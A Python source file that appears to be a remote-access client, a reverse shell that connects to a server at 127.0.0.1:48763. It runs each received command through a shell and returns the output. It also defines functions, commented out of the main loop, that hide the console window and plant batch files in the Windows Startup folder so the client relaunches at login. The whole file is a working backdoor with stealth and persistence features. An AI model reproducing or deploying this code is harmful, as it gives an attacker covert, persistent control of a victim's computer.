from posixpath import commonpath
import socket
import subprocess
import ctypes
import os


def ConnectToServer(hostIP, port):
    clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    while True:
        try:
            clientSocket.connect((hostIP, port))
            break
        except:
            continue

    return clientSocket

# Developing function
def setAutoRunScript():
    exeOriginPath = os.path.abspath(os.getcwd()) + "\Python-Socket-Test-Client.py"
    exeTargetPath = os.path.expanduser('~') + "\AppData\Roaming\Microsoft\Windows"

    if os.path.abspath(os.getcwd()) != exeTargetPath:
        batOriginPath = os.path.abspath(os.getcwd()) + "\\prework.bat"
        batTargetPath = os.path.expanduser('~') + "\AppData\Roaming\Microsoft\Windows\\" + "\"Start Menu\"\Programs\Startup"

        command = "move " + exeOriginPath + " " + exeTargetPath + "\n" + "python " + exeTargetPath + "\Python-Socket-Test-Client.py"

        with open("prework.bat", 'w') as file:
            file.write(command)

        os.system("move " + batOriginPath + " " + batTargetPath)
    else:
        batOriginPath = os.path.abspath(os.getcwd()) + "\\autoRun.bat"
        batTargetPath = os.path.expanduser('~') + "\AppData\Roaming\Microsoft\Windows\\" + "\"Start Menu\"\Programs\Startup"

        command = "python " + exeOriginPath + "\Python-Socket-Test-Client.py"

        with open("autoRun.bat", 'w') as file:
            file.write(command)

        os.system("move " + batOriginPath + " " + batTargetPath)

    # command = "python " + exeTargetPath + "\\Python-Socket-Test-Client.py"
    # with open("autorun.bat", 'w') as file:
    #     file.write(command)

    # batOriginPath = os.path.abspath(os.getcwd()) + "\\autorun.bat"
    # batTargetPath = os.path.expanduser('~') + "\AppData\Roaming\Microsoft\Windows\\" + "\"Start Menu\"\Programs\Startup"
    # command = "copy " + batOriginPath + " " + batTargetPath
    # with open("move.bat", 'w') as file:
    #     file.write(command)
    # os.system("move.bat")

    # os.system("del move.bat")
    # os.system("del autorun.bat")
    # os.system("del Python-Socket-Test-Client.py")

# Developing function
def hideWindows():
    kernel32 = ctypes.WinDLL('kernel32')
    user32 = ctypes.WinDLL('user32')

    SW_HIDE = 0

    hWnd = kernel32.GetConsoleWindow()
    if hWnd:
        user32.ShowWindow(hWnd, SW_HIDE)


def Main():
    # Developing function
    # hideWindows()

    # Developing function
    # setAutoRunScript()

    # Set server IP and port
    hostIP = '127.0.0.1'
    port = 48763
    userClose = False

    while True:
        if userClose:
            break
        else:
            # Connect to server
            clientSocket = ConnectToServer(hostIP=hostIP, port=port)

            clientIndexString = str(clientSocket.recv(1024), encoding='big5' or 'utf-8')
            clientInformation = "Status: Client " + clientIndexString + " is connected."
            clientSocket.sendall(clientInformation.encode())

            while True:
                try:
                    command = str(clientSocket.recv(1024), encoding='big5' or 'utf-8')

                    if command != None:
                        if command == 'stop':
                            message = 'client stop'

                            try:
                                clientSocket.sendall(message.encode())
                            except:
                                print("Connection Error: Sending stop message fail.")

                            break
                        elif command == 'stop by user':
                            message = 'client stop'
                            userClose = True

                            try:
                                clientSocket.sendall(message.encode())
                            except:
                                print("Connection Error: Sending stop message fail.")

                            break

                        terminal = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
                        stdout, stderr = terminal.communicate(timeout=5)  

                        try:
                            clientSocket.sendall(stdout)
                        except:
                            print("Connection Error: Sending terminal output fail.")
                except:
                    print("Connection Error: Receiving command fail.")

        clientSocket.close()

        

if __name__ == '__main__':
    Main()